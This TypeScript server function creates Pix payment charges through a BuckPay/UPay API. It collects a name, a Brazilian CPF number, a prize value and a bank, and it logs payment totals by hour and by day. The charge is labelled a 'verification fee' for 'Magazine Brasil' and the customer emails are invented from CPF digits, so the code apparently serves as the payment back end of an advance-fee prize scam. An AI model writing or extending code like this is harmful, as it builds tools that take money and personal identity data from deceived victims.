import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const inputSchema = z.object({
  amount: z.number().positive().max(100000),
  nome: z.string().min(3).max(200),
  cpf: z.string().min(11).max(14),
  premio_valor: z.number().nonnegative().max(1000000).optional(),
  banco: z.string().max(100).optional(),
});

export const createPixTransaction = createServerFn({ method: "POST" })
  .inputValidator((d: unknown) => inputSchema.parse(d))
  .handler(async ({ data }) => {
    const token = process.env.BUCKPAY_API_TOKEN;
    if (!token) throw new Error("BUCKPAY_API_TOKEN não configurado.");

    const cpfDigits = data.cpf.replace(/\D/g, "");
    const amountCents = Math.round(data.amount * 100);
    const external_id = `mag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

    const body = {
      product: "Taxa de verificação Magazine Brasil",
      amountCents,
      clientName: data.nome,
      clientEmail: `${cpfDigits}@magazine-brasil.com`,
      clientDocument: cpfDigits,
      paymentMethod: "PIX",
      metadata: {
        external_id,
        premio_valor: data.premio_valor ?? null,
        banco: data.banco ?? null,
      },
    };

    let res: Response | null = null;
    let text = "";
    let json: any = null;

    for (let attempt = 0; attempt < 2; attempt += 1) {
      res = await fetch("https://upay-sistema-api.onrender.com/api/v1/transactions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          "API-Key": token.trim(),
        },
        body: JSON.stringify(body),
      });

      text = await res.text();
      json = null;
      try {
        json = text ? JSON.parse(text) : null;
      } catch {
        /* noop */
      }

      if (![502, 503, 504].includes(res.status)) break;
      await new Promise((resolve) => setTimeout(resolve, 800));
    }

    if (!res) throw new Error("Não foi possível conectar à API Pix.");

    if (!res.ok) {
      if (res.status === 403) {
        console.error("[buckpay] chave sem permissão para criar transações:", text);
        throw new Error(
          "A chave da API Pix está sem permissão para criar transações. Ative a permissão de transações na BuckPay/UPay ou atualize BUCKPAY_API_TOKEN com uma chave autorizada.",
        );
      }

      if ([502, 503, 504].includes(res.status)) {
        console.error("[buckpay] provedor indisponível:", res.status, text.slice(0, 300));
        throw new Error("A API Pix está temporariamente indisponível. Tente novamente em alguns instantes.");
      }

      const message =
        json?.message ||
        json?.error?.message ||
        json?.error?.detail ||
        `Falha ao criar transação Pix (status ${res.status}).`;
      console.error("[buckpay] erro:", res.status, text);
      throw new Error(typeof message === "string" ? message : "Falha ao criar transação Pix.");
    }

    const transaction = json?.transaction ?? json?.data ?? json;
    const pixCode: string | undefined =
      transaction?.pixCode ||
      transaction?.pix_code ||
      transaction?.pix?.code ||
      transaction?.pix?.copyPaste ||
      transaction?.pix?.copy_paste ||
      transaction?.qrCode ||
      transaction?.qrcode;
    const qrBase64: string | undefined =
      transaction?.pixQrCodeBase64 ||
      transaction?.qrcode_base64 ||
      transaction?.pix?.qrcode_base64 ||
      transaction?.pix?.qrCodeBase64;
    const transactionId: string | undefined = transaction?.id;

    if (!pixCode) throw new Error("Resposta inválida da API Pix.");

    // Best-effort tracking
    try {
      const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
      await supabaseAdmin.from("payments").insert({
        amount: data.amount,
        premio_valor: data.premio_valor ?? null,
        nome: data.nome,
        banco: data.banco ?? null,
      });
      await Promise.all([
        supabaseAdmin.rpc("increment_daily_payment", { amount: data.amount }),
        supabaseAdmin.rpc("increment_hourly_payment", { amount: data.amount }),
      ]);
    } catch (e) {
      console.error("[buckpay] tracking falhou", e);
    }

    return {
      ok: true as const,
      external_id,
      transaction_id: transactionId ?? null,
      pix_code: pixCode,
      qrcode_base64: qrBase64 ?? null,
    };
  });